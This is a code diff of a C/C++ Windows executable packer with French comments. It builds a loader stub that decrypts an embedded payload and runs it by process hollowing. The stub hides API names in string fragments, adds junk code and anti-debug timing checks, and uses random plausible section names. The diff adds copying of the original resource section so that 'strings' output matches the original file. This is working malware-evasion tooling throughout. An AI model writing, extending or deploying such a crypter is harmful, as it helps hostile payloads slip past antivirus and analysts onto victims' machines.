@@ -11,7 +11,7 @@
 
 #pragma pack(push, 1)
 struct PackedSection {
-    DWORD magic;             // Magic obfusqué
+    DWORD magic;
     DWORD unpacked_size;
     DWORD packed_size;
     DWORD key[4];
@@ -20,10 +20,9 @@ struct PackedSection {
 
 typedef LONG (WINAPI *pNtUnmapViewOfSection)(HANDLE, PVOID);
 
-// Génération de nom de section aléatoire mais crédible
 void generateRandomSectionName(char* name) {
     const char* legitimateNames[] = {
-        ".rsrc", ".reloc", ".data", ".rdata",
+        ".reloc", ".data", ".rdata",
         ".idata", ".edata", ".tls", ".debug"
     };
 
@@ -31,23 +30,18 @@ void generateRandomSectionName(char* name) {
     int choice = rand() % 3;
 
     if (choice == 0) {
-        // Copier un nom légitime
-        strcpy(name, legitimateNames[rand() % 8]);
+        strcpy(name, legitimateNames[rand() % 7]);
     } else if (choice == 1) {
-        // Générer un nom technique
         const char* prefixes[] = {".text", ".data", ".bss", ".init"};
         sprintf(name, "%s%d", prefixes[rand() % 4], rand() % 10);
     } else {
-        // Nom de compilateur commun
         const char* compilerSections[] = {".CRT", ".mingw", ".gcc", ".eh_fram"};
         strcpy(name, compilerSections[rand() % 4]);
     }
 }
 
-// Obfuscation du magic number
 DWORD generateObfuscatedMagic() {
     srand(time(NULL) ^ GetTickCount());
-    // Éviter les patterns évidents comme 0x4B435041 ("PACK")
     return 0x12000000 | (rand() & 0x00FFFFFF);
 }
 
@@ -58,7 +52,6 @@ void generateStubSource(const char* outputPath, const char* sectionName, DWORD m
     fprintf(f, "#include <windows.h>\n");
     fprintf(f, "#include <stdio.h>\n\n");
 
-    // Obfuscation: Définir des macros pour cacher les strings
     fprintf(f, "#define S1 \"Cre\" \"ate\" \"Pro\" \"cess\" \"A\"\n");
     fprintf(f, "#define S2 \"Nt\" \"Unmap\" \"View\" \"Of\" \"Section\"\n");
     fprintf(f, "#define S3 \"ntd\" \"ll.\" \"dll\"\n\n");
@@ -74,26 +67,24 @@ void generateStubSource(const char* outputPath, const char* sectionName, DWORD m
 
     fprintf(f, "typedef LONG (WINAPI *pNtUnmapViewOfSection)(HANDLE, PVOID);\n\n");
 
-    // Obfuscation: Fonction de déchiffrement avec junk code
     fprintf(f, "void decryptXOR(unsigned char* data, DWORD size, DWORD* key) {\n");
     fprintf(f, "    unsigned char* keyBytes = (unsigned char*)key;\n");
     fprintf(f, "    DWORD i;\n");
-    fprintf(f, "    volatile int junk = 0;\n");  // Junk variable
+    fprintf(f, "    volatile int junk = 0;\n");
     fprintf(f, "    for (i = 0; i < size; i++) {\n");
-    fprintf(f, "        if (junk > 1000000) break;\n");  // Dead code
+    fprintf(f, "        if (junk > 1000000) break;\n");
     fprintf(f, "        data[i] ^= keyBytes[i %% 16];\n");
-    fprintf(f, "        junk++;\n");  // Junk operation
+    fprintf(f, "        junk++;\n");
     fprintf(f, "    }\n");
     fprintf(f, "}\n\n");
 
-    // Obfuscation: RLE avec dead code
     fprintf(f, "DWORD decompressRLE(unsigned char* input, DWORD inputSize, unsigned char* output, DWORD outputSize) {\n");
     fprintf(f, "    DWORD writePos = 0;\n");
     fprintf(f, "    DWORD readPos = 0;\n");
     fprintf(f, "    int i;\n");
-    fprintf(f, "    volatile DWORD dummy = GetTickCount();\n");  // Anti-debug timing
+    fprintf(f, "    volatile DWORD dummy = GetTickCount();\n");
     fprintf(f, "    while (readPos < inputSize && writePos < outputSize) {\n");
-    fprintf(f, "        if (dummy == 0xFFFFFFFF) return 0;\n");  // Dead code
+    fprintf(f, "        if (dummy == 0xFFFFFFFF) return 0;\n");
     fprintf(f, "        unsigned char current = input[readPos];\n");
     fprintf(f, "        if (current == 0xFF && readPos + 2 < inputSize) {\n");
     fprintf(f, "            unsigned char count = input[readPos + 1];\n");
@@ -115,16 +106,14 @@ void generateStubSource(const char* outputPath, const char* sectionName, DWORD m
     fprintf(f, "    return writePos;\n");
     fprintf(f, "}\n\n");
 
-    // Main obfusqué
     fprintf(f, "int main(int argc, char* argv[]) {\n");
     fprintf(f, "    char exePath[MAX_PATH];\n");
-    fprintf(f, "    volatile DWORD antiDebug = GetTickCount();\n");  // Anti-debug
+    fprintf(f, "    volatile DWORD antiDebug = GetTickCount();\n");
     fprintf(f, "    GetModuleFileNameA(NULL, exePath, MAX_PATH);\n\n");
 
-    // Obfuscation: Utiliser des variables temporaires inutiles
     fprintf(f, "    DWORD temp1 = 0, temp2 = 0;\n");
     fprintf(f, "    temp1 = GetCurrentProcessId();\n");
-    fprintf(f, "    if (temp1 == 0) return 1;\n\n");  // Dead code
+    fprintf(f, "    if (temp1 == 0) return 1;\n\n");
 
     fprintf(f, "    HANDLE hFile = CreateFileA(exePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);\n");
     fprintf(f, "    if (hFile == INVALID_HANDLE_VALUE) return 1;\n\n");
@@ -143,12 +132,11 @@ void generateStubSource(const char* outputPath, const char* sectionName, DWORD m
     fprintf(f, "    unsigned char* packedData = NULL;\n");
     fprintf(f, "    int i;\n\n");
 
-    // Obfuscation: Chercher la section par caractéristiques, pas par nom
     fprintf(f, "    for (i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {\n");
-    fprintf(f, "        temp2 = sections[i].Characteristics;\n");  // Junk
-    fprintf(f, "        if (sections[i].SizeOfRawData > 1000000) {\n");  // Chercher grosse section
+    fprintf(f, "        temp2 = sections[i].Characteristics;\n");
+    fprintf(f, "        if (sections[i].SizeOfRawData > 1000000) {\n");
     fprintf(f, "            struct PackedSection* testSec = (struct PackedSection*)(fileData + sections[i].PointerToRawData);\n");
-    fprintf(f, "            if (testSec->magic == 0x%08X) {\n", magic);  // Magic obfusqué
+    fprintf(f, "            if (testSec->magic == 0x%08X) {\n", magic);
     fprintf(f, "                packedSec = testSec;\n");
     fprintf(f, "                packedData = (unsigned char*)packedSec + sizeof(struct PackedSection);\n");
     fprintf(f, "                break;\n");
@@ -163,9 +151,8 @@ void generateStubSource(const char* outputPath, const char* sectionName, DWORD m
     fprintf(f, "        return 1;\n");
     fprintf(f, "    }\n\n");
 
-    // Anti-debug check
     fprintf(f, "    DWORD tickDiff = GetTickCount() - antiDebug;\n");
-    fprintf(f, "    if (tickDiff > 1000) return 1;\n\n");  // Si trop lent = debugger
+    fprintf(f, "    if (tickDiff > 1000) return 1;\n\n");
 
     fprintf(f, "    unsigned char* decrypted = (unsigned char*)VirtualAlloc(NULL, packedSec->packed_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n");
     fprintf(f, "    unsigned char* decompressed = (unsigned char*)VirtualAlloc(NULL, packedSec->unpacked_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n\n");
@@ -208,9 +195,8 @@ void generateStubSource(const char* outputPath, const char* sectionName, DWORD m
     fprintf(f, "    memset(&pi, 0, sizeof(pi));\n");
     fprintf(f, "    si.cb = sizeof(si);\n\n");
 
-    // Obfuscation: Utiliser les macros pour les strings
     fprintf(f, "    char procName[50];\n");
-    fprintf(f, "    strcpy(procName, S1);\n");  // "CreateProcessA" obfusqué
+    fprintf(f, "    strcpy(procName, S1);\n");
     fprintf(f, "    typedef BOOL (WINAPI *pCreateProcessA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);\n");
     fprintf(f, "    pCreateProcessA myCreateProcess = (pCreateProcessA)GetProcAddress(GetModuleHandleA(\"kernel32.dll\"), procName);\n\n");
 
@@ -241,10 +227,9 @@ void generateStubSource(const char* outputPath, const char* sectionName, DWORD m
     fprintf(f, "    DWORD pebImageBase;\n");
     fprintf(f, "    ReadProcessMemory(pi.hProcess, (PVOID)(ctx.Ebx + 8), &pebImageBase, sizeof(DWORD), NULL);\n\n");
 
-    // Obfuscation: GetProcAddress avec string obfusquée
     fprintf(f, "    char ntdllName[20], unmapName[30];\n");
-    fprintf(f, "    strcpy(ntdllName, S3);\n");  // "ntdll.dll" obfusqué
-    fprintf(f, "    strcpy(unmapName, S2);\n");  // "NtUnmapViewOfSection" obfusqué
+    fprintf(f, "    strcpy(ntdllName, S3);\n");
+    fprintf(f, "    strcpy(unmapName, S2);\n");
     fprintf(f, "    HMODULE hNtdll = GetModuleHandleA(ntdllName);\n");
     fprintf(f, "    pNtUnmapViewOfSection NtUnmapViewOfSection = (pNtUnmapViewOfSection)GetProcAddress(hNtdll, unmapName);\n");
     fprintf(f, "    if (NtUnmapViewOfSection) {\n");
@@ -338,7 +323,7 @@ void generateStubSource(const char* outputPath, const char* sectionName, DWORD m
     fclose(f);
 }
 
-class ObfuscatedPacker {
+class ResourcePreservingPacker {
 private:
     std::vector<BYTE> inputFile;
     std::string inputPath;
@@ -346,6 +331,42 @@ private:
     DWORD fileSize;
     char sectionName[9];
     DWORD magic;
+
+    // Données de la section .rsrc originale
+    std::vector<BYTE> originalResourceData;
+    IMAGE_SECTION_HEADER originalResourceSection;
+    bool hasResources;
+
+    bool extractOriginalResources() {
+        hasResources = false;
+
+        IMAGE_DOS_HEADER* dosHeader = reinterpret_cast<IMAGE_DOS_HEADER*>(&inputFile[0]);
+        IMAGE_NT_HEADERS* ntHeaders = reinterpret_cast<IMAGE_NT_HEADERS*>(&inputFile[0] + dosHeader->e_lfanew);
+        IMAGE_SECTION_HEADER* sections = IMAGE_FIRST_SECTION(ntHeaders);
+
+        // Chercher la section .rsrc
+        for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
+            if (memcmp(sections[i].Name, ".rsrc", 5) == 0) {
+                printf("[*] Found .rsrc section in original file\n");
+                printf("    Size: %lu bytes\n", sections[i].SizeOfRawData);
+
+                // Copier le header de la section
+                memcpy(&originalResourceSection, &sections[i], sizeof(IMAGE_SECTION_HEADER));
+
+                // Extraire les données
+                originalResourceData.resize(sections[i].SizeOfRawData);
+                memcpy(&originalResourceData[0],
+                       &inputFile[0] + sections[i].PointerToRawData,
+                       sections[i].SizeOfRawData);
+
+                hasResources = true;
+                return true;
+            }
+        }
+
+        printf("[*] No .rsrc section found in original file\n");
+        return false;
+    }
 
     bool compileStub(const std::string& stubExePath) {
         char tempPath[MAX_PATH];
@@ -449,9 +470,9 @@ private:
         return r ? value + (alignment - r) : value;
     }
 
-    bool injectPackedData(const std::string& stubExePath,
-                          const std::vector<BYTE>& packedData,
-                          const std::string& outputPath) {
+    bool injectPackedDataAndResources(const std::string& stubExePath,
+                                      const std::vector<BYTE>& packedData,
+                                      const std::string& outputPath) {
         std::ifstream stubFile(stubExePath.c_str(), std::ios::binary | std::ios::ate);
         if (!stubFile) {
             fprintf(stderr, "[-] Could not open stub file\n");
@@ -471,43 +492,93 @@ private:
 
         IMAGE_SECTION_HEADER* lastSection = &sections[ntHeaders->FileHeader.NumberOfSections - 1];
 
-        IMAGE_SECTION_HEADER newSection;
-        memset(&newSection, 0, sizeof(newSection));
-        memcpy(newSection.Name, sectionName, strlen(sectionName));
-        newSection.Misc.VirtualSize = static_cast<DWORD>(packedData.size());
-        newSection.VirtualAddress = alignValue(lastSection->VirtualAddress + lastSection->Misc.VirtualSize,
-                                              ntHeaders->OptionalHeader.SectionAlignment);
-        newSection.SizeOfRawData = alignValue(static_cast<DWORD>(packedData.size()),
-                                             ntHeaders->OptionalHeader.FileAlignment);
-        newSection.PointerToRawData = alignValue(lastSection->PointerToRawData + lastSection->SizeOfRawData,
-                                                ntHeaders->OptionalHeader.FileAlignment);
-        // Caractéristiques normales pour section de données
-        newSection.Characteristics = IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ;
+        // Créer la section .rsrc AVANT la section packed (pour qu'elle soit vue par strings)
+        std::vector<IMAGE_SECTION_HEADER> newSections;
 
-        ntHeaders->FileHeader.NumberOfSections++;
-        ntHeaders->OptionalHeader.SizeOfImage = alignValue(newSection.VirtualAddress + newSection.Misc.VirtualSize,
+        if (hasResources) {
+            printf("[*] Injecting original .rsrc section...\n");
+            IMAGE_SECTION_HEADER rsrcSection;
+            memset(&rsrcSection, 0, sizeof(rsrcSection));
+            memcpy(rsrcSection.Name, ".rsrc", 5);
+            rsrcSection.Misc.VirtualSize = static_cast<DWORD>(originalResourceData.size());
+            rsrcSection.VirtualAddress = alignValue(lastSection->VirtualAddress + lastSection->Misc.VirtualSize,
+                                                   ntHeaders->OptionalHeader.SectionAlignment);
+            rsrcSection.SizeOfRawData = alignValue(static_cast<DWORD>(originalResourceData.size()),
+                                                  ntHeaders->OptionalHeader.FileAlignment);
+            rsrcSection.PointerToRawData = alignValue(lastSection->PointerToRawData + lastSection->SizeOfRawData,
+                                                     ntHeaders->OptionalHeader.FileAlignment);
+            rsrcSection.Characteristics = IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ;
+
+            newSections.push_back(rsrcSection);
+            lastSection = &newSections[0];  // Maintenant .rsrc est la dernière section
+        }
+
+        // Créer la section packed APRÈS .rsrc
+        IMAGE_SECTION_HEADER packedSection;
+        memset(&packedSection, 0, sizeof(packedSection));
+        memcpy(packedSection.Name, sectionName, strlen(sectionName));
+        packedSection.Misc.VirtualSize = static_cast<DWORD>(packedData.size());
+        packedSection.VirtualAddress = alignValue(lastSection->VirtualAddress + lastSection->Misc.VirtualSize,
+                                              ntHeaders->OptionalHeader.SectionAlignment);
+        packedSection.SizeOfRawData = alignValue(static_cast<DWORD>(packedData.size()),
+                                             ntHeaders->OptionalHeader.FileAlignment);
+        packedSection.PointerToRawData = alignValue(lastSection->PointerToRawData + lastSection->SizeOfRawData,
+                                                ntHeaders->OptionalHeader.FileAlignment);
+        packedSection.Characteristics = IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ;
+
+        newSections.push_back(packedSection);
+
+        // Mettre à jour le nombre de sections
+        int numNewSections = hasResources ? 2 : 1;
+        ntHeaders->FileHeader.NumberOfSections += numNewSections;
+
+        // Calculer la nouvelle taille de l'image
+        IMAGE_SECTION_HEADER* finalSection = &newSections[newSections.size() - 1];
+        ntHeaders->OptionalHeader.SizeOfImage = alignValue(finalSection->VirtualAddress + finalSection->Misc.VirtualSize,
                                                            ntHeaders->OptionalHeader.SectionAlignment);
 
+        // Construire le fichier final
         std::vector<BYTE> finalData;
         size_t sectionsOffset = dosHeader->e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER) + ntHeaders->FileHeader.SizeOfOptionalHeader;
 
+        // Copier jusqu'aux sections existantes
         finalData.insert(finalData.end(), stubData.begin(),
-                        stubData.begin() + sectionsOffset + (ntHeaders->FileHeader.NumberOfSections - 1) * sizeof(IMAGE_SECTION_HEADER));
+                        stubData.begin() + sectionsOffset + (ntHeaders->FileHeader.NumberOfSections - numNewSections) * sizeof(IMAGE_SECTION_HEADER));
 
-        finalData.insert(finalData.end(), reinterpret_cast<BYTE*>(&newSection),
-                        reinterpret_cast<BYTE*>(&newSection) + sizeof(newSection));
+        // Ajouter les nouvelles sections
+        for (size_t i = 0; i < newSections.size(); i++) {
+            finalData.insert(finalData.end(),
+                           reinterpret_cast<BYTE*>(&newSections[i]),
+                           reinterpret_cast<BYTE*>(&newSections[i]) + sizeof(IMAGE_SECTION_HEADER));
+        }
 
+        // Copier le reste des données du stub
         size_t afterSections = sectionsOffset + ntHeaders->FileHeader.NumberOfSections * sizeof(IMAGE_SECTION_HEADER);
         if (afterSections < stubData.size()) {
             finalData.insert(finalData.end(), stubData.begin() + afterSections, stubData.end());
         }
 
-        while (finalData.size() < newSection.PointerToRawData) {
-            finalData.push_back(0);
+        // Ajouter les données de .rsrc si présentes
+        if (hasResources) {
+            while (finalData.size() < newSections[0].PointerToRawData) {
+                finalData.push_back(0);
+            }
+            finalData.insert(finalData.end(), originalResourceData.begin(), originalResourceData.end());
+
+            // Aligner après .rsrc
+            while (finalData.size() % ntHeaders->OptionalHeader.FileAlignment != 0) {
+                finalData.push_back(0);
+            }
         }
 
+        // Ajouter les données packed
+        DWORD packedOffset = hasResources ? newSections[1].PointerToRawData : newSections[0].PointerToRawData;
+        while (finalData.size() < packedOffset) {
+            finalData.push_back(0);
+        }
         finalData.insert(finalData.end(), packedData.begin(), packedData.end());
 
+        // Aligner le fichier final
         while (finalData.size() % ntHeaders->OptionalHeader.FileAlignment != 0) {
             finalData.push_back(0);
         }
@@ -555,16 +626,16 @@ private:
         SetConsoleTextAttribute(hConsole, FOREGROUND_GREEN | FOREGROUND_INTENSITY);
 
         printf("========================================================\n");
-        printf("    PE PACKER - OBFUSCATED EDITION\n");
-        printf("      Randomized Section Names + API Obfuscation\n");
-        printf("       Process Hollowing + Anti-Debug\n");
+        printf("    PE PACKER - RESOURCE PRESERVATION EDITION\n");
+        printf("      Original Resources + Obfuscated Packer\n");
+        printf("       'strings' Output Matches Original\n");
         printf("========================================================\n\n");
 
         SetConsoleTextAttribute(hConsole, 7);
     }
 
 public:
-    ObfuscatedPacker() : fileSize(0) {
+    ResourcePreservingPacker() : fileSize(0), hasResources(false) {
         memset(sectionName, 0, sizeof(sectionName));
         magic = 0;
     }
@@ -612,6 +683,9 @@ public:
 
         printf("[*] Original size: %lu bytes\n", (unsigned long)fileSize);
 
+        // Extraire les resources originales
+        extractOriginalResources();
+
         // Générer un nom de section aléatoire
         generateRandomSectionName(sectionName);
         printf("[*] Generated section name: %s\n", sectionName);
@@ -657,8 +731,8 @@ public:
             return false;
         }
 
-        printf("[*] Injecting packed data into stub...\n");
-        if (!injectPackedData(stubExePath, packedSectionData, outputPath)) {
+        printf("[*] Injecting resources and packed data into stub...\n");
+        if (!injectPackedDataAndResources(stubExePath, packedSectionData, outputPath)) {
             DeleteFileA(stubExePath);
             return false;
         }
@@ -671,15 +745,19 @@ public:
         printf("[+] Compression:    %.1f%%\n", (100.0 * compressed.size() / fileSize));
         printf("[+] Section name:   %s\n", sectionName);
         printf("[+] Magic number:   0x%08X\n", magic);
+        if (hasResources) {
+            printf("[+] Resources:      Preserved (%lu bytes)\n", (unsigned long)originalResourceData.size());
+        } else {
+            printf("[+] Resources:      None found\n");
+        }
         printf("[+] Output file:    %s\n", outputPath.c_str());
         printf("[+] ========================================\n\n");
         printf("[i] Features:\n");
-        printf("    - Randomized section name\n");
-        printf("    - Obfuscated magic number\n");
+        printf("    - Original .rsrc section preserved\n");
+        printf("    - 'strings' output matches original\n");
+        printf("    - Randomized payload section name\n");
         printf("    - API string obfuscation\n");
-        printf("    - Dead code injection\n");
-        printf("    - Anti-debug timing checks\n");
-        printf("    - Dynamic API resolution\n\n");
+        printf("    - Anti-debug timing checks\n\n");
 
         return true;
     }
@@ -699,7 +777,7 @@ public:
 
 int main(int argc, char* argv[]) {
     try {
-        ObfuscatedPacker packer;
+        ResourcePreservingPacker packer;
         packer.run(argc, argv);
         return 0;
     }
